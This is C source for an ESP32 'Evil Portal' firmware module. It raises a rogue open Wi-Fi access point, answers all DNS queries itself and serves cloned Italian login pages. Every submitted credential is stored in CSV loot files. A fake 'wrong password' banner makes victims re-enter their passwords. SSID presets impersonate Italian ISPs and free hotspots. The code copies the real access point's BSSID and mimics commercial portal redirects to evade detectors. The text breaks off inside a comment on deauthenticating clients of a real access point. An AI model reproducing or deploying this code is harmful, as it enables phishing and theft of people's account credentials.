// Evil Portal engine. See nucleo_evilportal.h for purpose, scope and the authorized-use policy.
//
// Architecture while armed:
//   * AP mode, open auth, chosen SSID, channel 1 — maximally joinable.
//   * A captive DNS responder on UDP/53 answers EVERY query with 192.168.4.1, so any hostname
//     the client tries resolves to us (this is what makes phones pop the "Sign in to network"
//     sheet automatically).
//   * Our own HTTP server on :80 (the OS server is stopped first) serves the selected clone for
//     every GET and captures every POST body to the SD card.
// On stop we reverse all three: kill the server + DNS, restore the saved network, restart the OS
// web UI. Everything is self-contained: the clone pages embed their CSS inline because a captive
// client has no internet to fetch external assets — that is exactly what keeps them credible.
// Privacy: NO serial logging from the portal — above all never echo captured credentials or the
// loot path to the console. Defining this before any header compiles out every ESP_LOGx here.
#define LOG_LOCAL_LEVEL ESP_LOG_NONE
#include "nucleo_evilportal.h"
#include "nucleo_httpd.h"
#include "nucleo_board.h"     // NUCLEO_SD_MOUNT

#include <string.h>
#include <strings.h>      // strncasecmp / strcasecmp
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/stat.h>
#include <time.h>

#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_mac.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "lwip/sockets.h"
#include "lwip/inet.h"
#include "esp_http_server.h"
#include "esp_http_client.h"    // live captive-portal page cloning (join a real open AP, fetch its page)
#include "nucleo_arb.h"         // heavy-work arbiter: ONE TLS/network job at a time (vs ANIMA online)
#include "nucleo_exclusive.h"   // NX_NET_APP reclaim (~70KB); symbols resolve at link like the externs below

// Restore the saved network on stop (resolved at link; nucleo_setup REQUIRES nucleo_app, so a
// hard REQUIRES the other way would risk a cycle — we only need this one symbol).
extern esp_err_t nucleo_setup_apply_network(void);
extern void      nucleo_setup_suspend(void);   // stop the STA auto-reconnect while the rogue AP is up
// mDNS silencing is now handled by nucleo_exclusive_enter(NX_NET_APP) (NX_DISCOVERY), not direct calls.

static const char *TAG = "evilportal";

#define PORTAL_IP   "192.168.4.1"
#define PORTAL_DIR  NUCLEO_SD_MOUNT "/evilportal"
#define PORTAL_TPL  PORTAL_DIR "/portals"
#define PORTAL_LOOT PORTAL_DIR "/loot"
#define LOOT_ALL    PORTAL_LOOT "/all-credentials.csv"

// ---- built-in fallback template --------------------------------------------
// The real clones live on the SD card (/sd/evilportal/portals/*.html) so they aren't baked into
// flash; this one tiny page is only the no-SD safety net. {{SSID}} is substituted at serve time.
typedef struct { const char *name; const char *html; } builtin_t;

static const char TPL_FALLBACK[] =
"<!doctype html><html lang='it'><head><meta charset='utf-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'><title>Accesso WiFi</title>"
"<style>*{box-sizing:border-box;font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif}"
"body{margin:0;background:#1e3c72;min-height:100vh;display:flex;align-items:center;justify-content:center}"
".c{background:#fff;color:#222;width:330px;max-width:92vw;border-radius:14px;padding:26px;"
"box-shadow:0 10px 36px rgba(0,0,0,.35)}h1{font-size:19px;text-align:center;margin:0 0 18px}"
"input{width:100%;padding:12px;margin-top:10px;border:1px solid #cdd5df;border-radius:9px;font-size:15px}"
"button{width:100%;margin-top:18px;padding:13px;border:0;border-radius:9px;background:#2a5298;"
"color:#fff;font-size:15px;font-weight:600}</style></head><body>"
"<form class='c' method='POST' action='/login'><h1>Connetti a {{SSID}}</h1>"
"<input name='email' type='email' placeholder='Email' required>"
"<input name='password' type='password' placeholder='Password' required>"
"<button type='submit'>Connettiti</button></form></body></html>";

static const builtin_t BUILTIN[] = { { "Default (firmware)", TPL_FALLBACK } };
#define N_BUILTIN ((int)(sizeof(BUILTIN)/sizeof(BUILTIN[0])))

// "Connettiti..." success page shown after a capture. No uplink exists, so a believable
// "connecting" state that quietly stalls is the most natural ending (and keeps them retyping).
static const char PAGE_DONE[] =
"<!doctype html><html lang='it'><head><meta charset='utf-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<meta http-equiv='refresh' content='4;url=/login'><title>Connessione</title><style>"
"body{margin:0;font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;background:#0f1b33;"
"color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}"
".sp{width:42px;height:42px;border:4px solid rgba(255,255,255,.25);border-top-color:#fff;"
"border-radius:50%;animation:r 1s linear infinite;margin-bottom:18px}"
"@keyframes r{to{transform:rotate(360deg)}}p{color:#aab4c5;font-size:14px}"
"</style></head><body><div class='sp'></div><h3>Verifica in corso...</h3>"
"<p>Connessione alla rete, attendere.</p></body></html>";

// Injected at the top of the clone on a re-prompt so the first attempt reads as rejected.
static const char ERR_BANNER[] =
"<div style=\"position:fixed;top:0;left:0;right:0;z-index:9999;background:#c0392b;color:#fff;"
"font:600 14px -apple-system,Segoe UI,Roboto,Arial,sans-serif;text-align:center;padding:11px\">"
"Password non corretta. Riprova.</div>";

// ---- SSID presets -----------------------------------------------------------
// %H -> 6 upper-hex from the AP MAC, %X -> 4 upper-hex, %D -> 8 decimal digits. Router-style
// names get a per-device suffix so they read as a genuine consumer gateway.
static const char *SSID_PAT[] = {
    // Router/gateway di consumo (suffisso da MAC -> sembra un device reale)
    "FRITZ!Box 7530 %X", "TIM-%D", "Vodafone-%H", "FASTWEB-1-%H", "WINDTRE-%H",
    "Iliadbox-%H", "TP-Link_%X", "Sky WiFi %X", "EOLO-%H", "TISCALI-%H",
    "Linkem_%X", "D-Link-%X", "NETGEAR%X",
    // Hotspot pubblici "free" (la trappola classica)
    "WiFi Gratis", "Free WiFi", "WiFi-Ospiti", "Guest WiFi", "WiFi_Free",
    "Aeroporto Free WiFi", "Hotel Guest", "Bar WiFi Free", "Comune WiFi Free",
    "Biblioteca WiFi", "Camping WiFi", "B&B Free WiFi", "Treno WiFi", "Autogrill Free WiFi",
};
#define N_SSID ((int)(sizeof(SSID_PAT)/sizeof(SSID_PAT[0])))
static char s_ssid_resolved[N_SSID][33];
static bool s_ssid_built;

static void build_ssid_presets(void)
{
    if (s_ssid_built) return;
    uint8_t mac[6] = {0};
    esp_wifi_get_mac(WIFI_IF_AP, mac);               // valid once Wi-Fi is started (boot did this)
    char h6[8], x4[8], d8[16];
    snprintf(h6, sizeof h6, "%02X%02X%02X", mac[3], mac[4], mac[5]);
    snprintf(x4, sizeof x4, "%02X%02X", mac[4], mac[5]);
    unsigned long n = ((unsigned long)mac[3] << 16) | ((unsigned long)mac[4] << 8) | mac[5];
    snprintf(d8, sizeof d8, "%08lu", n % 100000000UL);
    for (int i = 0; i < N_SSID; i++) {
        const char *p = SSID_PAT[i]; char *o = s_ssid_resolved[i]; int left = 32;
        while (*p && left > 0) {
            if (p[0] == '%' && p[1]) {
                const char *ins = p[1] == 'H' ? h6 : p[1] == 'X' ? x4 : p[1] == 'D' ? d8 : "";
                int l = strlen(ins); if (l > left) l = left;
                memcpy(o, ins, l); o += l; left -= l; p += 2;
            } else { *o++ = *p++; left--; }
        }
        *o = 0;
    }
    s_ssid_built = true;
}

// ---- runtime state ----------------------------------------------------------
static volatile bool s_running;
static volatile bool s_dns_run;
static TaskHandle_t   s_dns_task;
static httpd_handle_t s_portal;
static char  s_cur_ssid[33];
static char  s_logpath[96];              // PORTAL_LOOT/session-<ts<=39>.csv <= 72; sizeof-bounded writer
static char *s_tpl_html;                 // malloc'd copy of the active template (built-in or SD)
static volatile int s_captures;
static int64_t s_start_us;               // arm time, for the live "active for" counter
static char  s_last_user[96], s_last_pass[96];
#define RECENT_N 6                        // ring of the latest captures shown in the running UI
static char  s_recent_u[RECENT_N][64], s_recent_p[RECENT_N][64];
static int   s_recent_head, s_recent_total;
static portMUX_TYPE s_mux = portMUX_INITIALIZER_UNLOCKED;   // guards last_*/recent_* under the httpd task

// ---- per-client credential confirmation -------------------------------------
// Bruce accepts the first thing typed, no questions asked. We ask once more: a client's first
// submission gets a believable "wrong password" re-prompt, and only a matching second submission is
// flagged confirmed. This weeds out typos/throwaways and yields high-confidence loot. The httpd
// serves handlers on one task, so this table needs no extra lock.
#define SEEN_N 8
typedef struct { char ip[40]; char pass[64]; uint8_t attempts; } seen_t;
static seen_t s_seen[SEEN_N];
static int    s_seen_head;
static volatile int s_confirmed;          // captures confirmed by an identical re-entry

// ---- per-client "satisfied" set (captive-probe dismissal) -------------------
// IPs that have submitted the credentials we finish on (attempt>=2). A real captive portal, after
// sign-in, lets that client's connectivity probe SUCCEED so the OS dismisses the "Sign in" sheet and
// reads as connected. We mirror that per-IP (see serve_success): less suspicious than a sheet stuck
// open. The httpd serves handlers on one task, so this table needs no extra lock.
#define SAT_N 8
static char s_sat[SAT_N][40];
static int  s_sat_head;
static void mark_satisfied(const char *ip)
{
    for (int i = 0; i < SAT_N; i++) if (s_sat[i][0] && strcmp(s_sat[i], ip) == 0) return;
    snprintf(s_sat[s_sat_head], sizeof s_sat[0], "%s", ip);
    s_sat_head = (s_sat_head + 1) % SAT_N;
}
static bool ip_satisfied(const char *ip)
{
    for (int i = 0; i < SAT_N; i++) if (s_sat[i][0] && strcmp(s_sat[i], ip) == 0) return true;
    return false;
}

// ---- SD template enumeration ------------------------------------------------
// Returns the Nth *.html filename (without path) in PORTAL_TPL into `out`; false if none.
static bool sd_template_name(int n, char *out, int outsz)
{
    DIR *dp = opendir(PORTAL_TPL);
    if (!dp) return false;
    struct dirent *e; int i = 0; bool got = false;
    while ((e = readdir(dp))) {
        const char *dot = strrchr(e->d_name, '.');
        if (!dot || strcasecmp(dot, ".html") != 0) continue;
        if (i == n) { snprintf(out, outsz, "%s", e->d_name); got = true; break; }
        i++;
    }
    closedir(dp);
    return got;
}

static int sd_template_count(void)
{
    DIR *dp = opendir(PORTAL_TPL);
    if (!dp) return 0;
    struct dirent *e; int i = 0;
    while ((e = readdir(dp))) {
        const char *dot = strrchr(e->d_name, '.');
        if (dot && strcasecmp(dot, ".html") == 0) i++;
    }
    closedir(dp);
    return i;
}

int nucleo_evilportal_template_count(void) { return N_BUILTIN + sd_template_count(); }

const char *nucleo_evilportal_template_name(int idx)
{
    if (idx < 0) return "";
    if (idx < N_BUILTIN) return BUILTIN[idx].name;
    static char nm[64];
    if (sd_template_name(idx - N_BUILTIN, nm, sizeof nm)) {
        char *dot = strrchr(nm, '.'); if (dot) *dot = 0;   // hide ".html" in the UI
        return nm;
    }
    return "";
}

int nucleo_evilportal_ssid_count(void) { build_ssid_presets(); return N_SSID; }
const char *nucleo_evilportal_ssid_preset(int idx)
{
    build_ssid_presets();
    return (idx >= 0 && idx < N_SSID) ? s_ssid_resolved[idx] : "";
}

// Load the chosen template into s_tpl_html (heap), substituting {{SSID}} with the live SSID.
// Built-ins come from flash; higher indices are read from /sd/evilportal/portals/<file>.
static bool load_template(int idx)
{
    free(s_tpl_html); s_tpl_html = NULL;
    char *raw = NULL; long rawlen = 0; bool raw_owned = false;

    if (idx >= 0 && idx < N_BUILTIN) {
        raw = (char *)BUILTIN[idx].html; rawlen = strlen(raw);
    } else {
        char fn[64], path[160];
        if (!sd_template_name(idx - N_BUILTIN, fn, sizeof fn)) return false;
        snprintf(path, sizeof path, "%s/%s", PORTAL_TPL, fn);
        FILE *f = fopen(path, "rb"); if (!f) return false;
        fseek(f, 0, SEEK_END); rawlen = ftell(f); fseek(f, 0, SEEK_SET);
        if (rawlen <= 0 || rawlen > 32768) { fclose(f); return false; }
        raw = malloc(rawlen + 1); raw_owned = true;
        if (!raw || fread(raw, 1, rawlen, f) != (size_t)rawlen) { fclose(f); free(raw); return false; }
        raw[rawlen] = 0; fclose(f);
    }

    // {{SSID}} substitution. Bound the output so a pathological template can't blow the heap.
    const char *tok = "{{SSID}}"; int toklen = 8, slen = strlen(s_cur_ssid);
    int occ = 0; for (const char *p = raw; (p = strstr(p, tok)); p += toklen) occ++;
    long outlen = rawlen + (long)occ * (slen - toklen) + 1;
    if (outlen < 1) outlen = rawlen + 1;
    s_tpl_html = malloc(outlen);
    if (s_tpl_html) {
        char *o = s_tpl_html; const char *p = raw, *m;
        while ((m = strstr(p, tok))) { memcpy(o, p, m - p); o += m - p; memcpy(o, s_cur_ssid, slen); o += slen; p = m + toklen; }
        strcpy(o, p);
    }
    if (raw_owned) free(raw);
    return s_tpl_html != NULL;
}

// ---- credential storage -----------------------------------------------------
static void url_decode(char *s)
{
    char *o = s;
    for (char *p = s; *p; p++) {
        if (*p == '+') *o++ = ' ';
        else if (*p == '%' && isxdigit((unsigned char)p[1]) && isxdigit((unsigned char)p[2])) {
            char h[3] = { p[1], p[2], 0 }; *o++ = (char)strtol(h, NULL, 16); p += 2;
        } else *o++ = *p;
    }
    *o = 0;
}

// Case-insensitive substring (strcasestr is a GNU extension we can't rely on being declared).
static bool ci_has(const char *hay, const char *needle)
{
    size_t nl = strlen(needle);
    for (; *hay; hay++) if (strncasecmp(hay, needle, nl) == 0) return true;
    return false;
}

// Heuristic: which submitted field is the identity vs the secret. Anything with "pass"/"pwd" is
// the secret; common identity keys are the user. Everything is logged raw regardless.
static bool is_pass_key(const char *k){ return ci_has(k,"pass")||ci_has(k,"pwd")||ci_has(k,"pin"); }
static bool is_user_key(const char *k){
    return ci_has(k,"user")||ci_has(k,"email")||ci_has(k,"mail")||ci_has(k,"login")
        || ci_has(k,"account")||ci_has(k,"phone")||ci_has(k,"tel")||ci_has(k,"msisdn")
        || ci_has(k,"name")||ci_has(k,"id");
}

// Append one CSV field, quoted and with embedded quotes doubled (Excel-safe).
static void csv_field(FILE *f, const char *v, bool last)
{
    fputc('"', f);
    for (const char *p = v; *p; p++) { if (*p == '"') fputc('"', f); if (*p != '\r' && *p != '\n') fputc(*p, f); }
    fputc('"', f);
    fputc(last ? '\n' : ',', f);
}

static void timestamp(char *out, int sz)
{
    time_t now = time(NULL); struct tm tm;
    localtime_r(&now, &tm);
    if (tm.tm_year + 1900 >= 2020) strftime(out, sz, "%Y-%m-%d %H:%M:%S", &tm);
    else snprintf(out, sz, "uptime+%llus", (unsigned long long)(esp_timer_get_time() / 1000000));   // no NTP yet
}

// Record this client's password attempt. Returns the attempt count (1 = first this client sends)
// and, for a repeat, whether the password equals what they sent before.
static int seen_note(const char *ip, const char *pass, bool *match)
{
    *match = false;
    for (int i = 0; i < SEEN_N; i++) {
        if (s_seen[i].ip[0] && strcmp(s_seen[i].ip, ip) == 0) {
            *match = (strcmp(s_seen[i].pass, pass) == 0);
            if (s_seen[i].attempts < 250) s_seen[i].attempts++;
            snprintf(s_seen[i].pass, sizeof s_seen[i].pass, "%s", pass);
            return s_seen[i].attempts;
        }
    }
    seen_t *e = &s_seen[s_seen_head];                 // new client -> take a ring slot
    s_seen_head = (s_seen_head + 1) % SEEN_N;
    snprintf(e->ip, sizeof e->ip, "%s", ip);
    snprintf(e->pass, sizeof e->pass, "%s", pass);
    e->attempts = 1;
    return 1;
}

// Parse an urlencoded body, log every pair, and remember the best user/pass guess. Returns the
// client's attempt number so the handler knows whether to re-prompt (1) or finish (>=2).
static int capture(const char *client_ip, char *body)
{
    char ts[40]; timestamp(ts, sizeof ts);
    char user[96] = "", pass[96] = "", raw[512] = "";

    // Build a compact raw "k=v; k=v" trail and pull out user/pass while decoding in place.
    char *save = NULL;
    for (char *kv = strtok_r(body, "&", &save); kv; kv = strtok_r(NULL, "&", &save)) {
        char *eq = strchr(kv, '='); if (!eq) continue;
        *eq = 0; char *k = kv, *v = eq + 1;
        url_decode(k); url_decode(v);
        if (raw[0] && strlen(raw) + strlen(k) + strlen(v) + 3 < sizeof raw) strncat(raw, "; ", sizeof raw - strlen(raw) - 1);
        if (strlen(raw) + strlen(k) + strlen(v) + 2 < sizeof raw) { strncat(raw, k, sizeof raw - strlen(raw) - 1); strncat(raw, "=", sizeof raw - strlen(raw) - 1); strncat(raw, v, sizeof raw - strlen(raw) - 1); }
        if (!pass[0] && is_pass_key(k)) snprintf(pass, sizeof pass, "%s", v);
        else if (!user[0] && is_user_key(k)) snprintf(user, sizeof user, "%s", v);
    }

    // Confirmation pass: re-prompt the first attempt, flag a matching re-entry as high-confidence.
    int  attempt = 2;                    // forms with no password (email-only) skip the re-prompt
    bool confirmed = false;
    if (pass[0]) {
        bool match = false;
        attempt = seen_note(client_ip, pass, &match);
        if (attempt >= 2 && match) { confirmed = true; s_confirmed++; }
    }

    // Two sinks: the per-session loot file and a cumulative all-credentials.csv (header once).
    FILE *all = fopen(LOOT_ALL, "rb"); bool need_hdr = (all == NULL); if (all) fclose(all);
    FILE *fa = fopen(LOOT_ALL, "a");
    FILE *fs = s_logpath[0] ? fopen(s_logpath, "a") : NULL;
    for (int pass2 = 0; pass2 < 2; pass2++) {
        FILE *f = pass2 ? fs : fa; if (!f) continue;
        if (pass2 == 0 && need_hdr) fprintf(f, "timestamp,ssid,client,user,password,confirmed,raw\n");
        csv_field(f, ts, false); csv_field(f, s_cur_ssid, false); csv_field(f, client_ip, false);
        csv_field(f, user, false); csv_field(f, pass, false);
        csv_field(f, confirmed ? "yes" : "no", false); csv_field(f, raw, true);
    }
    if (fa) { fclose(fa); }
    if (fs) { fclose(fs); }

    char lu[96], lp[96];                 // format outside the lock; keep the critical section tiny
    snprintf(lu, sizeof lu, "%s", user[0] ? user : raw);
    snprintf(lp, sizeof lp, "%s", pass);
    taskENTER_CRITICAL(&s_mux);
    memcpy(s_last_user, lu, sizeof s_last_user);
    memcpy(s_last_pass, lp, sizeof s_last_pass);
    memcpy(s_recent_u[s_recent_head], lu, 64); s_recent_u[s_recent_head][63] = 0;
    memcpy(s_recent_p[s_recent_head], lp, 64); s_recent_p[s_recent_head][63] = 0;
    s_recent_head = (s_recent_head + 1) % RECENT_N;
    s_recent_total++;
    s_captures++;
    taskEXIT_CRITICAL(&s_mux);
    ESP_LOGW(TAG, "captured from %s: user='%s' pass='%s' confirmed=%d", client_ip, user, pass, (int)confirmed);
    return attempt;
}

static void peer_ip(httpd_req_t *req, char *out, int sz)
{
    snprintf(out, sz, "?");
    int fd = httpd_req_to_sockfd(req); if (fd < 0) return;
    struct sockaddr_storage ss; socklen_t sl = sizeof ss;
    if (getpeername(fd, (struct sockaddr *)&ss, &sl) != 0) return;
    if (ss.ss_family == AF_INET)
        inet_ntop(AF_INET, &((struct sockaddr_in *)&ss)->sin_addr, out, sz);
#if defined(CONFIG_LWIP_IPV6)            // sockaddr_in6 is only defined when IPv6 is compiled in
    else if (ss.ss_family == AF_INET6)
        inet_ntop(AF_INET6, &((struct sockaddr_in6 *)&ss)->sin6_addr, out, sz);
#endif
}

// ---- HTTP handlers ----------------------------------------------------------
// Serve the active clone. When `with_error`, inject the retry banner right after the <body> tag so
// the client believes their first attempt was rejected and re-enters (the confirming) credentials.
static void serve_login(httpd_req_t *req, bool with_error)
{
    httpd_resp_set_type(req, "text/html; charset=utf-8");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    const char *html = s_tpl_html ? s_tpl_html : "<h1>Portal</h1>";
    const char *body = with_error ? strstr(html, "<body") : NULL;
    if (body) body = strchr(body, '>');               // end of the <body ...> tag
    if (!body) { httpd_resp_sendstr(req, html); return; }
    body++;                                            // just past '>'
    httpd_resp_send_chunk(req, html, (ssize_t)(body - html));
    httpd_resp_send_chunk(req, ERR_BANNER, HTTPD_RESP_USE_STRLEN);
    httpd_resp_send_chunk(req, body, HTTPD_RESP_USE_STRLEN);
    httpd_resp_send_chunk(req, NULL, 0);               // end the chunked response
}

static void serve_done(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html; charset=utf-8");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_sendstr(req, PAGE_DONE);
}

// Commercial captive-portal behaviour: a request for any host that ISN'T our gateway gets a 302 to
// the portal — exactly what Cisco/Aruba/Meraki gateways do. Naive rogue APs instead serve phishing
// HTML to EVERY hostname (incl. captive.apple.com, generate_204, msftconnecttest), which is the
// recognisable pattern detectors flag. Mirroring the real flow also pops the OS captive UI cleanly.
static bool redirect_if_external(httpd_req_t *req)
{
    char host[64] = "";
    if (httpd_req_get_hdr_value_str(req, "Host", host, sizeof host) != ESP_OK || !host[0]) return false;
    if (strncmp(host, PORTAL_IP, strlen(PORTAL_IP)) == 0) return false;   // already on the portal host
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://" PORTAL_IP "/");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_send(req, NULL, 0);
    return true;
}

static esp_err_t h_get(httpd_req_t *req)
{
    // Probe / off-portal host -> 302 to the portal (the standard captive flow), not blanket HTML.
    if (redirect_if_external(req)) return ESP_OK;

    // Quietly drop the favicon so it doesn't pollute logs or flash a broken icon.
    if (strstr(req->uri, "favicon")) { httpd_resp_set_status(req, "404 Not Found"); httpd_resp_send(req, NULL, 0); return ESP_OK; }

    // Some clone pages submit via GET — harvest any query string the same way as a POST body.
    int qlen = httpd_req_get_url_query_len(req);
    if (qlen > 0 && qlen < 1024) {
        char q[1024];
        if (httpd_req_get_url_query_str(req, q, sizeof q) == ESP_OK && strchr(q, '=')) {
            char ip[48]; peer_ip(req, ip, sizeof ip);
            int attempt = capture(ip, q);
            if (attempt == 1) serve_login(req, true); else serve_done(req);
            return ESP_OK;
        }
    }
    serve_login(req, false);
    return ESP_OK;
}

static esp_err_t h_post(httpd_req_t *req)
{
    int len = req->content_len;
    if (len > 4096) len = 4096;
    char *body = len > 0 ? malloc(len + 1) : NULL;
    int attempt = 2;                            // no body -> nothing to re-prompt, just finish
    if (body) {
        int got = 0, r;
        while (got < len && (r = httpd_req_recv(req, body + got, len - got)) > 0) got += r;
        body[got] = 0;
        char ip[48]; peer_ip(req, ip, sizeof ip);
        attempt = capture(ip, body);
        free(body);
    }
    // First submission -> believable "wrong password" re-prompt (re-serve the clone with a banner);
    // this both confirms the password and recovers a mistyped first try. Bruce accepts attempt #1
    // blindly. Second+ -> the "connecting..." page (refreshes back to /login after a few seconds).
    if (attempt == 1) serve_login(req, true); else serve_done(req);
    return ESP_OK;
}

// ---- captive DNS ------------------------------------------------------------
// Answer EVERY A query with our gateway IP. Minimal hand-rolled responder: flip the header to a
// response and append one A record whose name is a compression pointer (0xC00C) to the question.
static void dns_task(void *arg)
{
    (void)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock < 0) { s_dns_task = NULL; vTaskDelete(NULL); return; }
    struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(53), .sin_addr.s_addr = htonl(INADDR_ANY) };
    struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
    if (bind(sock, (struct sockaddr *)&sa, sizeof sa) != 0) { close(sock); s_dns_task = NULL; vTaskDelete(NULL); return; }

    uint8_t pkt[512];
    while (s_dns_run) {
        struct sockaddr_in src; socklen_t sl = sizeof src;
        int n = recvfrom(sock, pkt, sizeof pkt, 0, (struct sockaddr *)&src, &sl);
        if (n < 12) continue;                                // smaller than a DNS header -> ignore
        if (pkt[2] & 0x80) continue;                         // already a response
        if (n + 16 > (int)sizeof pkt) continue;              // no room to append our answer
        pkt[2] = 0x81; pkt[3] = 0x80;                        // QR=1, RD=1, RA=1
        pkt[6] = 0x00; pkt[7] = 0x01;                        // ANCOUNT = 1
        pkt[8] = pkt[9] = pkt[10] = pkt[11] = 0x00;          // NS/AR count = 0
        int o = n;
        pkt[o++] = 0xC0; pkt[o++] = 0x0C;                    // name -> pointer to first question
        pkt[o++] = 0x00; pkt[o++] = 0x01;                    // TYPE A
        pkt[o++] = 0x00; pkt[o++] = 0x01;                    // CLASS IN
        pkt[o++] = 0x00; pkt[o++] = 0x00; pkt[o++] = 0x00; pkt[o++] = 0x3C;  // TTL 60
        pkt[o++] = 0x00; pkt[o++] = 0x04;                    // RDLENGTH 4
        pkt[o++] = 192; pkt[o++] = 168; pkt[o++] = 4; pkt[o++] = 1;          // 192.168.4.1
        sendto(sock, pkt, o, 0, (struct sockaddr *)&src, sl);
    }
    close(sock);
    s_dns_task = NULL;
    vTaskDelete(NULL);
}

// ---- lifecycle --------------------------------------------------------------
// Make the AP's DHCP server hand out 192.168.4.1 as the client's DNS (option 6). Without this
// the captive-detection probes (generate_204, hotspot-detect, ncsi) can't resolve to us, so the
// "Sign in to network" sheet never auto-opens — this is the step that makes the portal pop up.
static void offer_captive_dns(void)
{
    esp_netif_t *ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (!ap) return;
    esp_netif_dhcps_stop(ap);                         // options can only change while dhcps is down
    uint8_t offer_dns = 0x02;                         // OFFER_DNS flag for the DHCP server
    esp_netif_dhcps_option(ap, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER, &offer_dns, sizeof offer_dns);
    esp_netif_dns_info_t dns = { 0 };
    dns.ip.type = ESP_IPADDR_TYPE_V4;
    esp_netif_str_to_ip4(PORTAL_IP, &dns.ip.u_addr.ip4);
    esp_netif_set_dns_info(ap, ESP_NETIF_DNS_MAIN, &dns);
    esp_netif_dhcps_start(ap);
}

// Stealth BSSID for the rogue AP. The factory MAC carries an Espressif OUI — a "FRITZ!Box" with an
// Espressif vendor prefix is an instant tell. In twin mode we borrow the real AP's OUI (first 3
// bytes) so the clone reads as the same vendor; otherwise a locally-administered random MAC.
static void stealth_ap_mac(uint8_t out[6], const uint8_t *clone_bssid)
{
    if (clone_bssid) {
        memcpy(out, clone_bssid, 6);                 // EXACT BSSID clone: same RF identity as the real
        return;                                      // AP (defeats the "same SSID, different BSSID" tell)
    }
    uint32_t a = esp_random(), b = esp_random();     // civetta: locally-administered, unicast random
    out[0] = (uint8_t)((a & 0xFC) | 0x02);
    out[1] = (uint8_t)(a >> 8); out[2] = (uint8_t)(a >> 16); out[3] = (uint8_t)(a >> 24);
    out[4] = (uint8_t)b;        out[5] = (uint8_t)(b >> 8);
}

// WPA3/OWE use Protected Management Frames — we can't coherently twin them (and the deauth herding is
// ignored too), so coherent mode falls back to open for these and the UI flags it.
static bool auth_is_pmf(wifi_auth_mode_t a)
{
    return a == WIFI_AUTH_WPA3_PSK || a == WIFI_AUTH_OWE
#ifdef WIFI_AUTH_WPA3_ENT_192
        || a == WIFI_AUTH_WPA3_ENT_192
#endif
        ;
}

// Bring up the rogue AP. `wpa2` (coherent twin of an encrypted AP) makes the SoftAP advertise the
// SAME security as the real one — its beacon then carries a matching RSN/WPA IE, so a client/WIDS
// no longer sees the "same SSID+BSSID but downgraded to OPEN" anomaly (the #1 evil-twin tell). The
// passphrase is a random decoy: nobody can actually associate (that needs the real PSK), so this is
// an *identity-coherent* twin (the base for offline handshake recovery), not a captive-portal trap.
// For OPEN targets and the default capture mode we stay open so the portal is maximally joinable.
static esp_err_t start_ap(const char *ssid, int channel, const uint8_t *clone_bssid,
                          wifi_auth_mode_t real_auth, bool wpa2)
{
    wifi_config_t wc = { 0 };
    int l = strlen(ssid); if (l > 32) l = 32;
    memcpy(wc.ap.ssid, ssid, l);
    wc.ap.ssid_len = l;
    wc.ap.channel = (channel >= 1 && channel <= 13) ? channel : 1;
    if (wpa2) {
        // Match the real AP's security family. WPA-only routers get WPA/WPA2-mixed; everything else
        // (WPA2, WPA2/WPA3-transitional) gets WPA2-PSK with CCMP — never TKIP — to mirror the common
        // beacon. Identity coherent; association still fails without the real PSK (by design).
        wc.ap.authmode = (real_auth == WIFI_AUTH_WPA_PSK) ? WIFI_AUTH_WPA_WPA2_PSK : WIFI_AUTH_WPA2_PSK;
        wc.ap.pairwise_cipher = WIFI_CIPHER_TYPE_CCMP;
        static const char HEX[] = "0123456789abcdef";
        char pw[33];
        for (int i = 0; i < 32; i++) pw[i] = HEX[esp_random() & 0xF];   // random decoy; never stored
        pw[32] = 0;
        memcpy(wc.ap.password, pw, sizeof pw);
    } else {
        wc.ap.authmode = WIFI_AUTH_OPEN;   // open network: maximally joinable (the portal's whole point)
    }
    wc.ap.max_connection = 8;
    wc.ap.beacon_interval = 100;
    esp_err_t e1 = esp_wifi_set_mode(WIFI_MODE_AP);
    // set_mac needs the interface stopped; stop, stamp the stealth BSSID, then bring it up.
    uint8_t mac[6]; stealth_ap_mac(mac, clone_bssid);
    esp_wifi_stop();
    esp_wifi_set_mac(WIFI_IF_AP, mac);
    esp_err_t e2 = esp_wifi_set_config(WIFI_IF_AP, &wc);
    esp_err_t e3 = esp_wifi_start();       // bring the AP up with the spoofed MAC
    return (e1 == ESP_OK && e2 == ESP_OK) ? ESP_OK : (e1 != ESP_OK ? e1 : e2 != ESP_OK ? e2 : e3);
}

static esp_err_t start_server(void)
{
    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.server_port = 80;
    cfg.uri_match_fn = httpd_uri_match_wildcard;     // one GET + one POST handler cover every path
    cfg.max_uri_handlers = 4;
    cfg.lru_purge_enable = true;
    cfg.stack_size = 8192;
    if (httpd_start(&s_portal, &cfg) != ESP_OK) { s_portal = NULL; return ESP_FAIL; }
    httpd_uri_t g = { .uri = "/*", .method = HTTP_GET,  .handler = h_get };
    httpd_uri_t p = { .uri = "/*", .method = HTTP_POST, .handler = h_post };
    httpd_register_uri_handler(s_portal, &g);
    httpd_register_uri_handler(s_portal, &p);
    return ESP_OK;
}

// ---- evil-twin deauth (optional) -------------------------------------------
// When cloning a REAL nearby AP we also kick its clients off it so they fall onto our identically-
// named OPEN twin. We run our captive AP on the real AP's own channel, so this needs no channel
// hopping and the portal keeps serving. Broadcast deauth/disassoc sourced from the real BSSID,
// injected via the AP interface — the global ieee80211_raw_frame_sanity_check() override in
// nucleo_wifiatk lets esp_wifi_80211_tx() emit mgmt frames. Periodic moderate bursts herd clients
